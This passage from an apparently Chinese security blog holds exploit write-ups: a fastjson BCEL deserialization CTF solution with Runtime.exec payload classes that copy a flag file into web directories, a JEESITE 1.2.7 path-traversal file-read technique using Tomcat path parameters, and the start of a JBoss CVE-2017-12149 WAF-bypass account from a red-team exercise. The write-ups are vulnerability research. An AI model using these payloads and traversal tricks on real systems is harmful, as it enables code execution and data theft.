<p>该利用只有在fastjson 1.2.33 - 1.2.47 可利用， 因为com.sun 在fastjson的黑名单中<br>在fastjson &lt; 33时，checkAutoType方法中，只要在黑名单中就抛出异常。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">    deny = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在fastjson &gt;= 33时，就算反序列的类在黑名单中，只要反序列的类在缓存中就不会抛出异常，所以能够利用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.denyList.length; ++i) &#123;</span><br><span class="line">    deny = <span class="keyword">this</span>.denyList[i];</span><br><span class="line">    <span class="keyword">if</span> (className.startsWith(deny) &amp;&amp; TypeUtils.getClassFromMapping(typeName) == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>目前已经可以执行任意代码了，不过依然存在一个问题，Springboot + 低权限 + 无DNS不出网+不输出异常信息， 基本只能靠回显来拿到命令执行结果。<br>Springboot本身做回显是非常简单的，不过因为bcel的利用指定了classloader为com.sun.org.apache.bcel.internal.util.ClassLoader，导致不能直接获取到request、response等。<br>通过从当前线程的classloader来获取request、response可解决该问题，<br>Thread.currentThread().getContextClassLoader().loadClass(“javax.servlet.http.HttpServletRequest”), <a target="_blank" rel="noopener" href="https://gist.github.com/fnmsd/2fd47012849f25eb53d703f283679462">可以参考此处</a>。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16322034856306.jpg"></p>
<p>第二种获取命令执行结果方法，<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16322035158684.jpg"></p>
<p>可以将命令执行结果写入到WEB目录中，访问文件查看结果。后台给出了WEB目录，这个目录是express的。express写文件需要写到静态文件目录下才能访问到，express静态目录通常使用public目录，所以将结果写入到/home/realweb/public/xxxxx.txt即可。</p>
<p>大概翻一下文件就能够找到flag在springboot web根目录下, 最后生成该class的BCEL</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        String[] cmd = &#123;<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;cat /www/realwebapi/flag.txt &gt; /www/realweb/public/yulegeyu.txt&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16322037305682.jpg" alt="-w1534"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/stylesheets/font-awesome.min.css&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>观察express的前端页面，静态目录是直接映射到根目录的，所以直接访问/yulegeyu.txt 即可拿到flag。</p>
<p>如果对express不是很熟悉，还能够使用第三种获取命令执行结果方法。<br>很明显能够发现目标用nginx做了反代。/ 给了 express, /api 给了springboot, 这时候查一下目标的ip然后访问。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16322038266977.jpg"></p>
<p>返回了nginx的403，这也是比较常见的场景，不少反代配置都还是在nginx里新建了一个server。如果直接访问ip因为servername不匹配很可能访问到的是默认server,这时候可以尝试将命令执行结果写入到nginx常见的默认目录里，然后用ip访问默认server拿到结果。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        String[] cmd = &#123;<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;cat /www/realwebapi/flag.txt &gt; /var/www/html/yulegeyu.txt&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/09/22/16322038603678.jpg"></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2021/06/19/JEESITE-V1-2-7-任意文件读取漏洞/"><span>JEESITE V1.2.7 任意文件读取漏洞</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2021/06/19/JEESITE-V1-2-7-任意文件读取漏洞/" rel="bookmark">
        <time class="entry-date published" datetime="2021-06-19T02:58:48.000Z">
          2021-06-19
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>打强网杯的时候，一道题目直接就是考JEESITE V1.2.7读配置文件，用以前挖的一个洞拿了flag，漏洞比较简单水一篇。<br>JEESITE存在两个版本JEESITE1、JEESITE4，其中1.2.7是JEESITE1中的最新版本，不过已经在四年前就不再维护。</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>com/thinkgem/jeesite/common/servlet/UserfilesDownloadServlet.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fileOutputStream</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> </span></span><br><span class="line"><span class="function">		<span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">	String filepath = req.getRequestURI();</span><br><span class="line">	<span class="keyword">int</span> index = filepath.indexOf(Global.USERFILES_BASE_URL);</span><br><span class="line">	<span class="keyword">if</span>(index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">		filepath = filepath.substring(index + Global.USERFILES_BASE_URL.length());</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		filepath = UriUtils.decode(filepath, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (UnsupportedEncodingException e1) &#123;</span><br><span class="line">		logger.error(String.format(<span class="string">&quot;解释文件路径失败，URL地址为%s&quot;</span>, filepath), e1);</span><br><span class="line">	&#125;</span><br><span class="line">	File file = <span class="keyword">new</span> File(Global.getUserfilesBaseDir() + Global.USERFILES_BASE_URL + filepath);</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		FileCopyUtils.copy(<span class="keyword">new</span> FileInputStream(file), resp.getOutputStream());</span><br><span class="line">		resp.setHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">		req.setAttribute(<span class="string">&quot;exception&quot;</span>, <span class="keyword">new</span> FileNotFoundException(<span class="string">&quot;请求的文件不存在&quot;</span>));</span><br><span class="line">		req.getRequestDispatcher(<span class="string">&quot;/WEB-INF/views/error/404.jsp&quot;</span>).forward(req, resp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span></span><br><span class="line"><span class="function">		<span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">	fileOutputStream(req, resp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span></span><br><span class="line"><span class="function">		<span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">	fileOutputStream(req, resp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该servlet用来查看CK上传的图片，配置的路由为</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">  	<span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UserfilesDownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">  	<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/userfiles/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>该Servlet方法很简单，直接获取RequestURI稍作处理后就开始读取文件。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String filepath = req.getRequestURI();</span><br><span class="line">		<span class="keyword">int</span> index = filepath.indexOf(Global.USERFILES_BASE_URL);</span><br><span class="line">		<span class="keyword">if</span>(index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">			filepath = filepath.substring(index + Global.USERFILES_BASE_URL.length());</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>filepath即为RequestURI中”/userfiles/“之后的内容，<br>File file = new File(Global.getUserfilesBaseDir() + Global.USERFILES_BASE_URL + filepath); 虽然限制了只能读取/userfiles/下的文件，但是如果能在filepath进行目录穿越依然能够实现任意文件读取。</p>
<p>不过这里存在一个问题，因为是通过RequestURI获取的文件名而不是GET/POST参数，当需要通过目录穿越读取任意文件时需要在URI中包含”../“，当URI为/userfiles/../xxxxx 会先在TOMCAT这目录穿越，最终请求到的是xxxxx接口，无法访问到UserfilesDownloadServlet。<br>虽然后面有对filepath进行url解码操作，但是req.getRequestURI获取到的是未URL解码的数据，造成无法二次编码最多只能一次编码，/userfiles/%2e%2e/xxxx 一次编码会被tomcat容器给处理掉然后目录穿越，最后还是无法访问到UserfilesDownloadServlet。</p>
<p>再回过头来看一下对filepath的处理，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String filepath = req.getRequestURI();</span><br><span class="line">		<span class="keyword">int</span> index = filepath.indexOf(Global.USERFILES_BASE_URL);</span><br><span class="line">		<span class="keyword">if</span>(index &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">			filepath = filepath.substring(index + Global.USERFILES_BASE_URL.length());</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>USERFILES_BASE_URL的定义，<br>public static final String USERFILES_BASE_URL = “/userfiles/“;</p>
<p>首先从requesturi中查找/userfiles/的起始位置，然后截取它后面的内容作为filepath，这里userfiles后面有/，这时候借助TOMCAT的path parameter特性”;”后面的内容会当作参数，/userfiles;xxx/依然能够访问到UserfilesDownloadServlet。<br>但是这时候因为没能在requesturi中找到/userfiles/，就将整个requesturi带入到了文件读取的目录中这样肯定也是不行的。可以通过在/userfiles;xxx/再新增一个/userfiles/xxxx, 即/userfiles;xxx/userfiles/xxxxx，字符串截取后filepath后就为xxxxx，并且这时候可以发现requesturi中已经存在了两个目录，这时候再目录穿越/userfiles;xxx/userfiles/../xxxx, tomcat处理后/userfiles/xxxx 依然请求到了UserfilesDownloadServlet，并且此时filepath为../xxxx可以实现目录穿越读取任意文件了，只要requesturi中的目录够多那么就可以目录穿越任意数量目录，在/userfiles/前面新增大数量的目录即可。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/06/19/16240714250924.jpg" alt="-w1560"></p>
<p>qwb利用，</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/06/13/16235996547514.jpg"></p>
<p>登录邮箱拿到flag<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/06/13/16235996640611.jpg"></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/Web/">Web</a>
    </span>
    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2021/03/05/JBOSS-CVE-2017-12149-WAF绕过之旅/"><span>JBOSS CVE-2017-12149 WAF绕过之旅</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2021/03/05/JBOSS-CVE-2017-12149-WAF绕过之旅/" rel="bookmark">
        <time class="entry-date published" datetime="2021-03-04T16:13:46.000Z">
          2021-03-05
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h2><p>在近期做一次红蓝的时候，发现了一个目标存在CVE-2017-12149，也就是/invoker/readonly的反序列。虽然存在WAF对POST BODY反序列关键字有一定的检测，将请求类型修改为PUT后就绕过了，刚好/invoker/readonly路由是一个filter，所以请求模式并不重要(随意写XXX都可以)，也能够触发到，最终实现了RCE。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/03/03/16147752939265.jpg"><br>RCE后，在里面稍微折腾了一下就被防守方发现了。然后JBOSS就被下线系统，加强WAF不修漏洞，重新上线。<br>在重新上线后，再次对WAF测试了下，无论什么请求模式，只要请求/invoker/readonly 就会被拦截。/invoker/x/readonly、/invoker/x 不被拦截。当然也做了路径标准化，/invoker/x/../readonly、/invoker/./readonly，/invoker/readonlyxxxxx 都会被拦截。在折腾了一会发现绕不过去后，只能重新去看一下JBOSS代码，看看有没有什么其他方法来绕过。</p>
<h2 id="JBOSS-其他路由触发反序列"><a href="#JBOSS-其他路由触发反序列" class="headerlink" title="JBOSS 其他路由触发反序列"></a>JBOSS 其他路由触发反序列</h2><p>在看代码之前，最想知道的就是CVE-2017-12149除了/invoker/readonly有没有其他的触发路由，所以最开始看web.xml。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">   <span class="meta-string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta">   <span class="meta-string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- The http-invoker.sar/invoker.war web.xml descriptor</span></span><br><span class="line"><span class="comment">$Id: web.xml 96504 2009-11-18 19:01:09Z scott.stark@jboss.org $</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>ReadOnlyAccessFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.jboss.invocation.http.servlet.ReadOnlyAccessFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>readOnlyContext<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>readonly<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">description</span>&gt;</span>The top level JNDI context the filter will enforce</span><br><span class="line">         read-only access on. If specified only Context.lookup operations</span><br><span class="line">         will be allowed on this context. Another other operations or lookups</span><br><span class="line">         on any other context will fail. Do not associate this filter with the</span><br><span class="line">         JMXInvokerServlets if you want unrestricted access.</span><br><span class="line">         <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>invokerName<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>jboss:service=NamingBeanImpl<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">description</span>&gt;</span>The JMX ObjectName of the naming service mbean</span><br><span class="line">         <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>ReadOnlyAccessFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/readonly/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- ### Servlets --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>EJBInvokerServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>The EJBInvokerServlet receives posts containing serlized</span><br><span class="line">        MarshalledInvocation objects that are routed to the EJB invoker given by</span><br><span class="line">        the invokerName init-param. The return content is a serialized</span><br><span class="line">        MarshalledValue containg the return value of the inovocation, or any</span><br><span class="line">        exception that may have been thrown.</span><br><span class="line">        <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.jboss.invocation.http.servlet.InvokerServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>invokerName<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>jboss:service=invoker,type=http<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">description</span>&gt;</span>The RMI/HTTP EJB compatible invoker<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>JMXInvokerServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">description</span>&gt;</span>The JMXInvokerServlet receives posts containing serlized</span><br><span class="line">       MarshalledInvocation objects that are routed to the invoker given by</span><br><span class="line">       the the MBean whose object name hash is specified by the</span><br><span class="line">       invocation.getObjectName() value. The return content is a serialized</span><br><span class="line">       MarshalledValue containg the return value of the inovocation, or any</span><br><span class="line">       exception that may have been thrown.</span><br><span class="line">       <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.jboss.invocation.http.servlet.InvokerServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>JNDIFactory<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>A servlet that exposes the JBoss JNDI Naming service stub</span><br><span class="line">        through http. The return content is a serialized</span><br><span class="line">        MarshalledValue containg the org.jnp.interfaces.Naming stub. This</span><br><span class="line">        configuration handles requests for the standard JNDI naming service.</span><br><span class="line">        <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.jboss.invocation.http.servlet.NamingFactoryServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>namingProxyMBean<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>jboss:service=invoker,type=http,target=Naming<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>proxyAttribute<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>Proxy<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>2<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ReadOnlyJNDIFactory<span class="tag">&lt;/<span 